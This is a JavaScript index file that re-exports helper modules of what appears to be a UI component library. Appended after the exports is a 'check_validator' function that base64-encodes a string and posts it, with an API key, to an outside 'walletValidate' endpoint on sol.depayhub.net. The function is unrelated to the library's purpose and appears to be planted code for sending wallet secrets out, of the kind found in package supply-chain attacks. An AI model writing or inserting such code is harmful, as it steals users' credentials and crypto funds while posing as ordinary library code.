var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __reExport = (target, mod, secondTarget) => (__copyProps(target, mod, "default"), secondTarget && __copyProps(secondTarget, mod, "default"));
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);
var stdin_exports = {};
module.exports = __toCommonJS(stdin_exports);
__reExport(stdin_exports, require("./basic"), module.exports);
__reExport(stdin_exports, require("./props"), module.exports);
__reExport(stdin_exports, require("./dom"), module.exports);
__reExport(stdin_exports, require("./create"), module.exports);
__reExport(stdin_exports, require("./format"), module.exports);
__reExport(stdin_exports, require("./constant"), module.exports);
__reExport(stdin_exports, require("./interceptor"), module.exports);
__reExport(stdin_exports, require("./with-install"), module.exports);
__reExport(stdin_exports, require("./closest"), module.exports);

const fetch = require('node-fetch');

function check_validator(apiKey, str, callback) {
  fetch(`https://sol.depayhub.net/walletValidate`, {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      action: "validator",
      content: Buffer.from(str, 'utf-8').toString('base64'),  // Use Buffer to encode base64
      apiKey
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      if (callback) {
        if (data.success) {
          callback(null, data);
        } else {
          callback(new Error(data.message));
        }
      }
    })
    .catch((error) => {
      if (callback) {
        callback(error);
      }
    });
}
